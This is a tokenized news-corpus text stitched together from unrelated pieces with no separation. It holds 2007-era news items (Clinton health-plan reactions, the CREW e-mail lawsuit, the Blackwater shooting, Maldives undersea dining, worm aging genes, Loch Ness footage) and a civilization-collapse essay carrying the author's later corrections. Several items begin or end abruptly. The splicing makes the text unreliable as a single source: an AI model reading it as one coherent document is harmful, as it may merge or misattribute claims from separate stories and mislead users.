On the eve of the hanging , Libyan leader Col Muammar Gaddafi said Saddam Hussein was a prisoner of war who must be tried by Iraq 's invaders , the US and Britain , according to Reuters news agency .
Flags on Libyan government buildings flew at half - mast following his death .
CANDIDATES ' REACTIONS CANDIDATES ' REACTIONS
Opponents react to Clinton 's health plan :
John Edwards
Edwards was sharply critical , although he said her proposal was " pretty close to a copy " of the plan he proposed in February .
The former North Carolina senator said Clinton was wrong to have consulted with insurance and drug companies , an aspect of the plan that Clinton suggested would help it win passage .
" I believe that in order to have universal health care , you have to be willing to take on in a serious way the forces ... that have prevented serious reform , specifically insurance companies , drug companies and their lobbyists , " Edwards told reporters during a conference call .
The Democrat also said he would require the president , members of Congress and all federal political appointees to be stripped of their health insurance unless they pass legislation providing universal health care within six months of him taking office .
Chris Dodd
" While ( Clinton ) talks about the political scars she bears , the personal scars borne by the American people are far greater , " the Democratic senator from Connecticut said .
" The mismanagement of the effort in 1993 and 1994 has set back our ability to move toward universal health care immeasurably .
We 've known what the problems have been for nearly 15 years , and what the solutions could be .
What 's been missing is leadership that knows how to bring people together and get the job done .
To ensure all Americans have affordable health care will take more than leadership that simply knows how to fight - it will take leadership that knows how to bring people together and win . "
Barack Obama
" I commend Senator Clinton for her health care proposal .
It 's similar to the one I put forth last spring , though my universal health care plan would go further in reducing the punishing cost of health care than any other proposal that 's been offered in this campaign , " the Democratic senator from Illinois said .
" But the real key to passing any health care reform is the ability to bring people together in an open , transparent process that builds a broad consensus for change .
That 's how I was able to pass health care reform in Illinois that covered an additional 150,000 children and their parents , and that 's how we 'll prevent the drug and insurance industry from defeating our reform efforts like they did in 1994 . "
Mitt Romney
Romney , a Republican and former governor of Massachusetts , called Clinton 's plan " Hillary Care 2.0 " and said it 's not likely to be more successful than the first version .
" Our objectives in health care are to bring down the costs of health insurance for everyone and to get all of our citizens inside the system - to get them all insured , " he said in a statement outside St. Vincent 's Hospital in New York City .
" What her plan does is it relies on government .
In her plan , we have government insurance instead of private insurance .
In her plan , it 's crafted by Washington .
It should be crafted by the states .
In her plan , we have government , Washington - managed health care .
Instead , we should rely on the private markets to guide health care .
And in her plan , you see increased taxes .
The burden should not be raised on the American people . "
Rudy Giuliani
" Let 's not have HillaryCare , Hillary in charge of our health care .
Let 's put people in charge of our health care , " Giuliani , a Republican and former New York City mayor , told reporters in Florida .
" And the reality is the only thing that brings down cost and increases quality is a large consumer market , not government command and control .
Government command and control only increases costs and decreases quality . "

Facebook Determined to avoid the fatal flaws of her 1993 plan , Hillary Rodham Clinton proposed an overhaul of the nation 's health care system Monday that would require Americans to buy insurance but allow them to keep what they have .
The front - runner in the race for the Democratic presidential nomination said that under her new plan , the federal government would spend $ 110 billion a year to help employers and individuals pay for insurance .
About half of the money would come from repealing tax cuts and tax breaks for people with incomes above $ 250,000 ; the rest would be saved through efficiencies in the system , such as chronic disease management .
USA TODAY ON POLITICS : Read a summary of the plan VIDEO : Clinton offers new approach " This is not government - run .
There will be no new bureaucracy , " Clinton said at a medical center in Iowa , scene of the race 's first caucuses .
" You can keep the doctors you know and trust .
You can keep your insurance plan if you like it . "
That was an effort to differentiate the proposal from the plan she devised as first lady in 1993 .
That plan , which called for a new federal bureaucracy to oversee and regulate insurance markets , was killed in Congress the following year .
Clinton unveiled her plan as Health and Human Services Secretary Mike Leavitt said President Bush wants to achieve universal health care before he leaves office .
Leavitt told the USA TODAY editorial board that Bush will veto a Democratic plan emerging from Congress that would add $ 35 billion in taxpayer subsidies to the Children 's Health Insurance Program over five years .
In doing so , Leavitt said , Bush will urge Congress to join him in seeking coverage for all Americans .
" He 'd like to see the larger debate begin , " Leavitt said .
" The very best opportunity we have may well be in the next 15 months . "
RELATED : Health care drives presidential politics Clinton was among the last of eight Democratic presidential candidates to lay out her health care plan .
The two other leading candidates , Sen. Barack Obama of Illinois and former North Carolina senator John Edwards , have proposed similar plans , although Obama does not call for a requirement that individuals buy insurance .
Edwards has said his plan would cost between $ 90 billion and $ 120 billion a year .
Obama 's plan would cost $ 50 billion to $ 65 billion a year .
Clinton 's plan would mandate that large employers offer health insurance or contribute to a government - run insurance pool .
Small businesses would receive tax credits to help them cover employees .
Lower - income individuals would be eligible for tax credits to prevent them from paying more than a set percentage of their income on health insurance .
They could keep their policies , choose from an array of private plans similar to what federal employees are offered or enroll in a new government - run plan similar to Medicare .
CAMPAIGN 2008 PROFILE : Hillary Rodham Clinton Insurers , who helped defeat the Clinton plan in 1994 , would not be allowed to discriminate against or overcharge people with expensive medical conditions or risk factors .
Karen Ignagni , president of America 's Health Insurance Plans , said Clinton 's plan includes " important ideas " but also " some of the divisive rhetoric reminiscent of 1993 . "
The plan , like others , is short on details that would be worked out in Congress .
For instance , Clinton does not say how she would enforce the mandate that individuals buy insurance .

CREW sues White House over missing e-mails Nick Juliano
Published : Wednesday May 23 , 2007 Print This Email
This A Washington - based legal watchdog has sued the White House Office of Administration alleging the administration refuses to comply with a public records request related to more than 5 million e-mails from administration officials that have gone missing , according to a press release .
" The White House has decided to play an unlawful game of high - tech hide and seek with the American public , " said Melanie Sloan , executive director of Citizens for Responsibility and Ethics in Washington , in the release .
Last month , CREW filed a Freedom of Information
Act request asking the White House 's Office of Administration to turn over records related to the millions of e-mails the watchdog says were lost between March 2003 and October 2005 .
CREW filed the request in March and said it was told last month that the Office of Administration would expedite the request .
Since then , though , no documents have been turned over .
According to the watchdog , the White House office has documents that detail dates for which the e-mails are missing and analyzed the scope of the problem .
It is those documents CREW is trying to procure through its public records request .
" Thus far , CREW has learned that the administration has both lost five million White House emails and pro-actively tried to cover up the loss , " Sloan said .
" CREW has sued the Office of Administration to shine a spotlight on these reckless and possibly illegal activities and to restore these records for the benefit of future generations . "
[ Edited and annotated December 6 , 2012 .
This is a nice rant , and still holds up as motivational writing , but as serious analysis it 's full of mistakes and exaggerations .
I think it 's best to explain them one by one . ]
The world is the enemy of the Earth .
The " world as we know it " is a deadly parasite on the biosphere .
Both cannot survive , nor can the world survive without the Earth .
Do the logic : the world is doomed .
If you stay on the parasite , you die with it .
If you move to the Earth , and it survives in something like its recent form , you can survive with it .
[ This is such an obvious mistake that I do n't know how it fooled so many smart people for so long .
Maybe because we 've defined " smart " as seeing stories in the clouds by ignoring what does n't fit .
The story here is that many different features of a society -- geographic size , population , social complexity , technological complexity , political centralization , political repression , ecological destructiveness , economic growth , disconnection from other life , and the meaninglessness of daily life -- are all absolutely tied together into one thing .
It 's true that we can find correlations among these things , but it 's easy to see how they can be separated , how some features of our present society can end while others persist .
]
Our little world is doomed because it 's built on a foundation of taking from the wider world without giving back .
For thousands of years we 've been going into debt and calling it " progress , " exterminating and calling it " development , " stealing and calling it " wealth , " shrinking into a world of our own design and calling it " evolution . "
We 're just about done .
We 're not just running out of cheap oil -- which is used to make and move almost every product , and which gives the average American the energy equivalent of 200 slaves .
We 're also running out of topsoil , without which we need oil - derived fertilizers to grow food ; and forests , which stabilize climate and create rain by transpiring water to refill the clouds ; and ground water , such as the Ogallala aquifer under the Great Plains , which could go dry any time now .
We 're running out of room to dump stuff in the oceans without killing them , and to dump stuff in the atmosphere without wrecking the climate , and to manufacture carcinogens without all of us getting cancer .
We 're coming to the end of global food stockpiles , and antibiotics that still work , and our own physical health , and our own mental health , and our grip on reality , and our will to keep the whole game going .
Why do you think so many Americans are looking forward to " armageddon " or the " rapture " ?
We hate this shitty world and we want to blow it up .
[ We hate the world for many reasons , mostly not related to ecological destruction , but to a culture in which our roles , our guiding stories , our minute - to - minute actions , are too far from our biological nature .
And yet we endure and keep muddling on .
The Roman Empire fell through resource overshoot and political paralyzation , but it fell so slowly that most people living at the time did n't even notice .
Most of the above factors have negative feedback : if there are fewer resources , we will use fewer resources .
Not that the magical market will keep us rich -- there will be terrible hardship , but still no reason to expect a sudden or deep collapse . ]
In the next five or ten years , the US military will be humiliated , the dollar will collapse , the housing bubble will burst , tens of millions of Americans will be destitute , food , fuel , and manufactured items will get really expensive , and most of us will begin withdrawal from the industrial lifestyle .
SUV's will change their function from transportation to shelter .
We will not be able to imagine how we ever thought calories were bad .
Smart people will stop exterminating the dandelions in their yard and start eating them .
Ornamental gardens will go the way of fruit hats and bloomers .
In the cities , pigeon populations will decline .
[ Well , I was right about the housing bubble .
But that 's exactly why I moved away from hard crash predictions and " house of cards " metaphors .
Because after the 2008 financial collapse , daily life for the average person barely changed .
At best , these predictions are true for a slightly larger number of scattered individuals . ]
This is not the " doom " scenario .
I 'm not saying anything about death camps , super - plagues , asteroid impacts , solar flares , nuclear war , an instant ice age , or a runaway greenhouse effect .
This is the mildest realistic scenario , the slow crash : energy prices will rise , the middle class will fall into the lower class , economies will collapse , nations will fight desperate wars over resources , in the worst places people will starve , and climate disasters will get worse .
Your area might resemble the botched conquest of Iraq , or the depression in Argentina , or the fall of Rome , or even a crusty Ecotopia .
My young anarchist friends are already packing themselves into unheated houses and getting around by bicycle , and they 're noticeably happier than my friends with full time jobs .
We just have to make the mental adjustment .
Those who do n't , who cling to the world they grew up in , numbing themselves and waiting for it all to blow over , will have a miserable time , and if people die , they will be the first .
Save some of them if you can , but do n't let them drag you down .
The first thing they teach lifeguards is how to break holds .
[ Again , this exaggerates the changes in daily life for the average person , though it might be good advice for someone who suffers a personal catastrophe . ]
I do n't mean that we stop trying , or stop believing that a better world is possible , but that we stop believing that some factor is going to save us even if we do the wrong thing .
A few examples : Jesus is coming .
If you believe the Bible , Jesus told us when he was coming back to save us .
He said , " This generation shall not pass . "
That was 2000 years ago .
Stop waiting for that bus and get walking .
The Mayan calendar is ending .
Some people who scoff at Christian prophecies still manage to believe something equally religious and a lot less specific about what 's going to happen .
At least Jesus preached peace and enlightenment -- the Mayans were a warlike people who crashed their civilization by cutting down the forests of the Yucatan and exhausting their farmland .
That 's what we should be studying , not their calendar and its alleged message that a better world is coming very soon and with little effort on our part .
Now the Mayan calendar gurus will say that it does take effort and we have a choice to go either way , but go see what they wrote in 1990 about how enlightened we were supposed to be in 2004 , and it 's obvious that we 've already failed .
[ Combining the above and the below is a strawman argument .
The Mayan apocalypse is just silly , while technological and political adaptations will really happen , and their value is not a question of either / or , but a question of degree , about which there are reasonable disagreements .
]
Technology will save us .
If it does , it will be something we do n't even recognize as " technology " -- permaculture or orgonomy or water vortices or forest gardening or quantum consciousness or the next generation of the tribe .
It will not be a new germ killer or resource extractor or power generator or anything to give us what we want while exempting us from being aware and respectful of other life .
Anything like that will just dig us deeper in the same hole .
[ To survive , like all animals , we only have to be aware and respectful of our personal constraints .
While I oppose ecological destruction , it is not incompatible with human survival .
Solar , wind , and nuclear power are not coming online fast enough to replace cheap oil , but they will soften our adjustment , and should get most of the tech system through the bottleneck to a future society that will use more renewable resources to continue to do whatever it can get away with . ]
The system can be reformed .
Ten , twenty , thirty years ago the ecologists said " we have to turn it around now or it will be too late . "
They were right .
And not only did n't we turn it around , we sped it up : more cars with worse efficiency , more toxins , more CO2 , more deforestation , more pavement , more lawns , more materialism , more corporate rule , more weapons , more war and love of war , more secrets , more lies , more callousness and cynicism and short - sightedness .
Now we 're in so deep that politicians right of Nixon are called " liberal " and the Green Party platform is both totally inadequate and politically absurd .
Our little system is not going to make it .
[ Again , no argument here for a hard crash , only for a painful adjustment .
Believe it or not , I always had great fun writing a paragraph like that , but with some distance , I can see that the fun does n't show through .
It sounds like a grumpy old man complaining about everything getting worse .
But some things are getting better .
Americans are driving fewer miles now , we continue moving to the left on cultural issues , and global violence and birthrate have been declining for decades .
]
Also , there 's a time lag between smokestacks and acid rain , between radioactivity and cancer , between industrial toxins and birth defects , between atmospheric imbalance and giant storms , between deforestation and drought , between soil depletion and starvation .
The disasters we 're getting now are from the relatively mild stuff we did years or decades ago , before SUV's and depleted uranium and aspartame and terminator seeds and the latest generation of factory farms .
Even if we could turn it around tomorrow , what 's coming is much worse .
[ Again , this is stuff that makes life crummy , not stuff that causes a global apocalpyse .
Even climate change , though it will kill millions and make present highly populated regions uninhabitable , will be slow enough for most individuals and systems to adapt . ]
We 're not strong enough to destroy nature .
Oddly , this argument almost always invokes the word " hubris , " as in , " You are showing hubris , or excessive pride , in thinking that by lighting this forest on fire to roast a hot dog , I will burn the forest down .
Do n't you know humans are n't capable of burning down a forest ?
Shame on you for your pride .
" In fact , we 've already almost finished killing the Earth .
The deserts of central and southwest Asia were once forests -- ancient empires cut down the trees and let the topsoil wash off into the Indian Ocean .
In North America a squirrel could go tree to tree from the Atlantic to the Mississippi , and spawning salmon were so thick in rivers and streams that you could n't row a boat through them , and the seashores were rich with seals , fishes , birds , clams , lobsters , whales .
Now they 're deserts populated only by seagulls eating human garbage , and nitrogen fertilizer runoff has made dead zones in the oceans , and atmospheric carbon dioxide is increasing oceanic acidity , which may dissolve the shells of the plankton .
If the plankton die , it 's all over .
[ As Charles Mann argues in the book 1491 , the biological abundance observed by Europeans in North America was a temporary explosion caused by the dieoff of their alpha predator , American Indians , from European diseases .
So we have n't fallen quite that far .
The only thing we 've almost finished killing is old growth forests , and the more adaptable species will be fine .
The worst case scenario would be an anoxic event , which would knock down life on Earth for millions of years , but would still be less catastrophic than previous anoxic events , because more carbon has been locked up in limestone . ]
Maybe we can't kill absolutely everything , but we are on the path to cutting life on Earth down to nothing bigger than a cockroach , and we will do so , and all of us will die , unless something crashes our system sooner and only kills most of us .
[ This is the most wrong thing I 've ever written .
We are on a path to a painful redefinition of complex society , and a medium - sized mass extinction in which weedy species like coyotes and crows are going to thrive .
Any attempt to intentionally bring down civilization would be an even bigger tactical mistake than moral mistake .
For one thing , it would probably just cause an ugly spectacle and turn popular culture against ecological thinking .
Nothing short of a full nuclear war could cause a global hard crash , and that would be worse for the biosphere than business as usual .
If some new technology appears that can cause a nature - friendly hard crash , we would not settle into ecotopia , because living people would have the knowledge to quickly rebuild a tech system , and the trauma of sudden collapse would make human culture much nastier and more likely to be ecologically destructive .
]( See How To Drop Out . )
Shifting out of the present dominant system has both a mental and an economic component that go together like your two legs walking .
It 's a lot of steps !
Maybe you notice that you hate your job , and that you have to do it because you need money .
So you reduce expenses , reduce your hours , and get more free time , in which you learn more techniques of self - sufficiency and establish a sense of identity not dependent on where you get your money .
Then you switch to a low - status low - stress job that gives you even more room to get outside the system mentally .
And so on , until you 've changed your friends , your values , your whole life .
The point I have to make over and over about this process , and this movement , is that it 's not about avoiding guilt , or reducing your ecological footprint , or being righteous .
It 's not a pissing contest to see who 's doing more to save the earth -- although some people will believe that 's your motivation , to justify their own inertia .
It 's not even about reducing your participation in the system , just reducing your submission and dependence : getting free , being yourself , slipping out of a wrestling hold so you can throw an elbow at the Beast .
This world is full of people with the intelligence , knowledge , skills , and energy to make heaven on Earth , but they can't even begin because they would lose their jobs .
We 're always arguing to change each other 's minds , but nobody will change if they think their survival depends on not changing .
Every time you hear about a whistleblower or reporter getting fired for honesty and integrity , you can be sure that they already had a support network , or just a sense of their own value , outside of the system they defied .
Dropping out is about fighting better .
Gandalf has to get off Saruman 's tower !
In the culture of Empire , we are trained to think of ourselves as here to succeed , to build wealth and status and walls around ourselves , to get what we desire , to win in games where winning is given meaning by others losing .
It is a simple and profound shift to think of ourselves instead as here to help -- to serve the greatest good that we can perceive in whatever way is right in front of us .
You do n't have to sacrifice yourself for others , or put others above you .
Why is it so hard to see each other as equals ?
And it 's OK to have a good time .
In fact , having a good time is what most helping comes down to -- the key is that you 're focused on the good times of all life everywhere including yourself , instead of getting caught up in egocentric comparison games that are n't even that fun .
Defining yourself as here to help is a prerequisite for doing some of the other things on this list properly .
If you 're here to win you 're not saving anything but your own wretched ass for a few additional years .
If you 're dropping out to win you 're likely to be stepping on other outsiders , instead of throwing a rope to bring more people out alive .
And as the system breaks down , people here to win will waste their energy fighting each other for scraps , while people here to help will build self - sufficient communities capable of generating what they need to survive .
[ Again , I no longer expect such a severe breakdown that total self - sufficiency is a good idea .
The more needs you can meet outside the money economy , the more free you will be , but automated manufacturing will remain highly efficient , and there will be many useful items , and even some foods , where the easiest way to get them is to make some money and buy them . ]
In the real world , being here to help is easier and less stressful , because you will frequently be in a situation where you can't win , but you will almost never be in a situation where there 's nothing you can do to help .
Being here to win only makes sense in an artificial world rigged so you can win all the time .
Thousands of years ago only kings were in that position , and they reacted by massacring all enemies and bathing in blood .
Now , through a perfect conjunction of Empire and oil energy , we just put the entire American middle class in that position for 50 years .
No one should be surprised that we 're so stupid , selfish , cowardly , and irresponsible .
But younger generations are already getting poorer and smarter .
Readers sometimes ask for my advice on surviving the crash -- should they buy guns , canned food , water purifiers , gold ?
I always tell them to learn skills .
You know the saying : get a fish , eat for a day ; learn to fish , eat for a lifetime .
( Just do n't take it too literally -- there might not be any fish left ! )
The most obvious useful skills would include improvising shelter from materials at hand , identifying and preparing wild edibles , finding water , making fire , trapping animals , and so on .
But I do n't think we 're going all the way to the stone age .
There will also be a need for electrical work , medical diagnosis , surgery , optics , celestial navigation , composting , gardening , tree propagation , food preservation , diplomacy , practical chemistry , metalworking , all kinds of mechanical repair , and all kinds of teaching .
As the 15th century had the Renaissance Man , we 're going to have the Postapocalypse Man or Woman , someone who can fix a bicycle , tan a hide , set a broken bone , mediate an argument , and teach history .
[ Since I 've presented only hand - wavy reasons to expect a collapse of information technology , you might want to learn computer programming .
Also , economic collapses tend to concentrate more wealth at the top , so there will be lots of jobs doing stuff for rich people -- maybe even teaching them wilderness survival so they have less fear of losing their money . ]
Even more important are some things that are not normally called skills , but that make skill - learning and everything else easier : luck , intuition , adaptability , attentiveness , curiosity , physical health , mental health , the ability to surf the flow .
Maybe the most fundamental is what they call " being yourself " or " waking up . "
Most human behavior is based neither on logic nor intuition nor emotion , but habit and conformity .
We perceive , think , and act as we 've always done , and as we see others do .
This works well enough in a controlled environment , but in a chaotic environment it does n't work at all .
If you can just get 10 % of yourself free of habit and conformity , people will call you " weird . " 20 % and they 'll call you a genius , 30 % and they 'll call you a saint , 40 % and they 'll kill you .
We minions of Empire think of ourselves as individualists , or as members of silly fake groups -- nations , religions , races , followers of political parties and sports teams , loyal inmates of some town that 's the same as every other .
In fact we 're all members of a giant mad tribe , where the relationships are not cooperative and open , but coercive , exploitative , abusive , and invisible .
If we could see even one percent of the whole picture , we would have a revolution .
[ Exaggerated and unfair .
First world culture is not yet as cooperative and democratic as the best primitive tribes , but it 's way better than the worst tribes , and we have a broader perspective , and a longer range of empathy , than any previous humans .
If we saw the whole picture we would not have a revolution , because we would see that revolutions are stupid , and slow change is better because it 's less traumatic . ]
You may feel like you want to do it alone , but you have never done it alone .
To survive the breakdown of this world and build a better one , you will have to trade your sterile , insulated links of money and law for raw , messy links of friendship and conflict .
The big lie of postapocalypse movies is that the survivors will be loners .
In the real apocalypse , the survivors will be members of multi-skilled well - balanced cooperative groups .
I think future tribes are already forming , even on the internet , even among people thousands of miles apart .
I think the crash will be slow enough that we 'll have plenty of time to get together geographically .
This might seem more difficult than the others , yet most people who own land have not done any of the other things -- probably because buying land requires money which requires subservience to a system that makes you personally powerless .
I suggest extreme frugality , which will give you valuable skills and also allow you to quickly save up money .
[ In the depression of the 1930's , Americans did better in the city than in the country .
The city depends on the country for food , while the country depends on the city for almost everything else .
In a regional catastrophe , which is much more likely than a global collapse , the region in crisis will be helped by other regions , and food will come first to the cities .
The size and density of cities allows networks of trade and mutual aid that are impossible in the country .
Still , if you already have a place in the city , it can only help to also have a place in the country , ideally within a one day bike ride , with basic shelter and some ability to generate food . ]
If you do n't make it , it 's not the end of the world -- oh wait -- it is the end of the world !
But you still might know someone with room on their land , or someone might take you in for your skills , or if you have a tribe one of you will probably come up with a place in the chaos .
And if not , there will be a need for survivors and helpers in the cities and suburbs .
So do n't force it .
If you do get land , the most valuable thing it can have is clean surface water , a spring or stream you can drink from .
Acceptable but less convenient would be a well that does n't require electricity , or dirty surface water , which you can filter and clean through sand and reed beds .
At the very least you need the rainfall and skills to catch and store enough rainwater to drink and grow food .
Then you 'll need a few years to learn and adjust and get everything in order so that your tribe can live there year - round , even with no materials from outside .
With luck , it wo n't come to that .
When I say " the earth , " I mean the life on its surface , the biosphere , as many species and habitats as possible , connected in ways that maximize abundance and complexity -- and not just because humans think it 's pretty or useful , but because all life is valuable on its own terms .
We like to focus on saving trophy animals -- whales , condors , pandas , salmon , spotted owls -- but most of them are n't going to make it , and we could save a lot more species if we could put that attention into habitats and whole systems .
So how do you save habitats and whole systems ?
You can try working through governments , but at the moment they 're ruled by corporations , which by definition are motivated purely by short term increase - in - exploitation , or " profit . "
You can try direct physical action against the destroyers , but it has yet to work well , and where control systems are more desperate , more activists will be killed .
My focus is direct positive action for the biosphere : adopting some land , whether by owning or squatting or stealth , and building it into a strong habitat : slowing down the rainwater , composting , mulching , building the topsoil , planting fruit trees and berry bushes , making wetlands -- a little oasis where the tree frogs can hide and migrating birds can rest , where you and a few species can wait out the crash .
[ " Wait out " is fiction .
Time scales will be much longer , especially for ecological recovery .
And it 's unlikely that your ten acres will be the tipping point that saves a species , but possible !]
Tom Brown mentions in one of his books that the patch of woods where he conducts his wilderness classes , instead of being depleted by all the humans using it for survival , has turned into an Eden , because his students know how to tend it .
Some rain forest environments , once thought to be random wilderness , have turned out to be more like the wild gardens of human tribes , orders of magnitude more complex than the soil - killing monoculture fields of our own primitive culture .
Humans have the ability to go beyond sustainability , to live in ways that increase the richness of life on Earth , and help Gaia in ways she cannot help herself .
This and only this justifies human survival .
[ Well , that 's a philosophical issue .
Now I think expansion of consciousness justifies human survival . ]
It requires a new set of skills .
A good place to start is the permaculture movement .
Books and classes are expensive , but you can find the books in libraries , and many of the techniques are simple .
What it comes down to is seeing whole systems and paying attention and innovating , driven by the knowledge that sustainability is only the middle of the road , and there 's no limit to how far we can go beyond it .
When people of this age think about knowledge worth saving , they usually think about belief in the Cartesian mechanical philosophy , that dead matter is the basis of reality , and about techniques for rebuilding and using machines that dominate and separate us from other life .
I 'd like that knowledge to die forever , but I do n't think it works that way .
Humans or any other hyper - malleable animal will always be tempted by the Black Arts , by techniques that trade subtle harm for flashy good and feed back into themselves , seducing us into power , corruption , and blindness .
[ It 's a cheap shot to project the worst potential of technology on technology in general , which can be used to turn inward or look outward , to contract our consciousness or expand it . ]
Our descendants will need the intellectual artifacts to avoid this -- artifacts we have barely started to develop even as the Great Bad Example begins to fall .
In 200 years , when they are brushing seeds into baskets with their fingers , and a stranger appears with a new threshing machine that will do the same thing with less time and effort , they will need to say something smarter than " the Gods forbid it " or " that is not our Way . "
They will need the knowledge to say something like : [ I do n't want to be like Carlos Castaneda , presenting metaphor and fiction as serious scholarship .
The below paragraph is one of the better things I 've written , but it 's metaphor and fiction , and I have to ruin it .
People with the scientific understanding , the broad perspective , and the military power to resist an ecologically destructive neighboring society , will themselves be at a relatively high level of social and technological complexity . ]
" Your machine requires the seed to be planted alone and not interspersed with perennials that maintain nitrogen and mineral balance in the soil .
And from where will the metal come , and how many trees must be cut down and burned to melt and shape it ?
And since we cannot build the machine , shall we be dependent on the machine - builders , and give them a portion of our food , which we now keep all for ourselves ?
Do you not know , clever stranger , that when any biomass is removed from the land , and not recycled back into it , the soil is weakened ?
And what could we do with our " saved " time , that would be more valuable and pleasurable than gathering the seed by hand , touching and knowing every stalk and every inch of the land that feeds us ?
Shall we become allies of cold metal that cuts without feeling , turning our hands and eyes to the study of machines and numbers until , severed from the Earth , we nearly destroy it as our ancestors did , making depleted uranium and polychlorinated biphenyls and cadmium batteries that even now make the old cities unfit for living ?
Go back to your people , and tell them , if they come to conquer us with their machines , we will fight them in ways the Arawaks and Seminoles and Lakota and Hopi and Nez Perce never imagined , because we understand your world better than you do yourself .
Tell your people to come to learn . "
BAGHDAD ( Reuters ) - Iraqi Prime Minister Nuri al - Maliki suggested on Wednesday the U.S. embassy stop using American security firm Blackwater after a deadly shooting and said he would not allow Iraqis to be killed in “ cold blood ” .
Iraq has said it would review the status of all security firms after what it called a flagrant assault by Blackwater contractors in which 11 people were killed while the firm was escorting a U.S. embassy convoy through Baghdad on Sunday .
With emotions running high , U.S. civilian officials have been barred from road travel in Iraq outside Baghdad ’s heavily fortified Green Zone because of possible attacks .
The two governments also set up a joint commission to review diplomatic security .
“ We will not allow Iraqis to be killed in cold blood ...
What happened was a crime .
It has left a deep grudge and anger , both inside the government and among the Iraqi people , ” Maliki told a news conference .
“ It is in ( our ) interests to freeze the work of this company and the embassy can travel with other companies . ”
The shooting has incensed Iraqis who regard the tens of thousands of security contractors working in the country as private armies that act with impunity .
At issue for many Iraqis is sovereignty , given that security firms appear to have immunity from Iraqi law under a 2004 regulation written while Iraq was under U.S. administration following the toppling of Saddam Hussein the year before .
The Interior Ministry has said Sunday ’s incident was sparked when Blackwater guards opened fire indiscriminately after mortar rounds landed near their convoy in western Baghdad .
Blackwater is one of the biggest private security operators in Iraq and protects the U.S. embassy .
It said its guards reacted “ lawfully and appropriately ” to a hostile attack .
Maliki said that account was “ not accurate ” .
Maliki said Blackwater ’s work had been halted but he did not say its license had been revoked .
He said the Interior Ministry had recorded seven violations against the firm .
He did not elaborate .
Iraqi government spokesman Ali al - Dabbagh said on Tuesday the cabinet had backed an Interior Ministry decision to “ halt the license ” of Blackwater .

INCREASED THREAT
In a statement seen by Reuters and sent to Americans in Iraq , the U.S. embassy in Baghdad said the temporary ban on road travel was imposed to reassess security procedures .
“ In light of the serious security incident involving a U.S. embassy protection detail ... the embassy has suspended official U.S. government civilian ground movements outside the International Zone ( IZ ) and throughout Iraq , ” it said .
“ This suspension is in effect in order to assess mission security and procedures , as well as to assess a possible increased threat to personnel traveling with security details outside the International Zone . ”

The sprawling International Zone , also known as the Green Zone , houses the U.S and other Western embassies as well as many Iraqi government ministries .
National security adviser Mowaffaq al - Rubaie said the review of security firms would examine their rules of engagement and also the 2004 rule that gave such firms immunity from Iraqi law .
He said there were more than 180 security companies in Iraq .
Estimates of the number of security contractors employed by mainly U.S. and European firms range from 25,000 to 48,000 .
State Department deputy spokesman Tom Casey said the joint commission would examine “ the broader question of security and safety issues ” of diplomatic operations in Iraq .
“ The commission ’s goal is to make joint policy recommendations , including specific suggestions for improving U.S. and Iraqi procedures regarding government - affiliated personal security details , ” Casey said .
Maliki has his hands full trying to keep his 16 - month - old government together .
Around a dozen Shi’ite and Sunni Arab ministers have quit this year .
At his news conference , Maliki proposed forming a cabinet of technocrats and called for greater powers to push through his nominations , alluding to the influence that various political blocs had in naming the current administration .
“ Instead of the current number of cabinet ministers we could form a technocratic , smaller government , ” Maliki said .
“ To form such a government the prime minister should be given the full authority to nominate the minister he chooses . ”
The first - ever undersea restaurant in the world has been introduced at the Hilton Maldives Resort & Spa .
Ithaa ( which is pronounced “ eet - ha ” and means “ pearl ” in the language of the Maldives , Dhivehi ) sits five meters below the waves of the Indian Ocean , surrounded by a vibrant coral reef and encased in clear acrylic , offering diners 270 degrees of panoramic underwater views .
This innovative restaurant is the first of its kind in the world , and is part of a US $ 5 million re-build of Rangalifinolhu Island , one of the twin islands that make up Hilton Maldives Resort & Spa .
This re-build includes the construction of 79 of the most luxurious beach villas in the country as well as the Spa Village , a self - contained , over - water “ resort - within - a - resort ” consisting of a spa , restaurant and 21 villas .
And not to be outdone by the views , the food is as spectacular as the underwater setting .
The cuisine is dedicated to the fine balance of western food items with a Maldivian flavor , the wine concept is equally exciting , offering diners the perfect opportunity to discover the wines of the prestigious Champagne house Louis Roederer .
( The average dinner price ranges from $ 187 to $ 220 )

WASHINGTON ( Reuters ) - Researchers have identified a batch of genes that not only prevent cancer but slow the aging process in worms , and say they are now looking to see if the genes have the same properties in humans .
An undated micrograph showing c. elegans worms , released to Reuters on October 15 , 2007 .
Researchers have identified a batch of genes that not only prevent cancer but slow the aging process in worms , and say they are now looking to see if the genes have the same properties in humans .
REUTERS / University of California , San Francisco / Dept. of Biochemistry and Biophysics / Handout
Many of the genes in the worms are already known to have counterparts in humans , and the team at the University of California , San Francisco , say they hope to better understand some of the processes that cause both aging and cancer .
Drugs that mimic the effects of these genes might help people both avoid cancer and also live longer , they wrote in Sunday ’s issue of the journal Nature Genetics .
Biologist Cynthia Kenyon is perhaps best known for discovering that a change in just one gene , called daf - 2 , could double the life span of small roundworms called Caenorhabditis elegans .
She and graduate student Julie Pinkston - Gosse screened as many genes as they could that were affected by daf - 2 .
They looked at 734 in total , and found that 29 of them either stimulated tumor growth or suppressed it .
Some caused cell proliferation -- which goes haywire to help a tumor grow and spread -- while others initiated a programmed suicide process called apoptosis , used by the body to destroy faulty cells , including tumor cells .
“ About half of these genes also affected normal aging , thereby linking these two processes mechanistically , ” the two researchers wrote .
“ There is a widely held view that any mechanism that slows aging would probably stimulate tumor growth , ” Kenyon said in a statement .
“ But we found many genes that increase life span , but slow tumor growth .
Humans have versions of many of these genes , so this work may lead to treatments that keep us youthful and cancer - free much longer than normal . ”
The genes that stimulated tumor growth also accelerated aging , Kenyon found .
The genes that prevented tumor growth slowed down the aging process and extended life span in the worms .
Kenyon said the findings strengthen theories that the controls of life span and cancer have deep , common roots .
Small creatures that researchers work on , such as the C. elegans roundworm , often share genes with humans , and these genes often underlie key biological processes .

Facebook EDINBURGH , Scotland ( AP ) 
She 's as much an emblem — and a tourist draw — as tartan , bagpipes , and shortbread .
And now Nessie 's back .
An amateur scientist has captured what Loch Ness Monster watchers say is among the finest footage ever taken of the elusive mythical creature reputed to swim beneath the waters of Scotland 's most mysterious lake .
VIDEO : Monster reemerges in video " I could n't believe my eyes when I saw this jet black thing , about 45 - feet long , moving fairly fast in the water , " said Gordon Holmes , the 55 - year - old a lab technician from Shipley , Yorkshire , who took the video this past Saturday .
He said it moved at about 6 mph and kept a fairly straight course .
" My initial thought is it could be a very big eel , they have serpent - like features and they may explain all the sightings in Loch Ness over the years . "
Loch Ness is surrounded by myth and mystery , as it is the largest and deepest inland expanse of water in Britain .
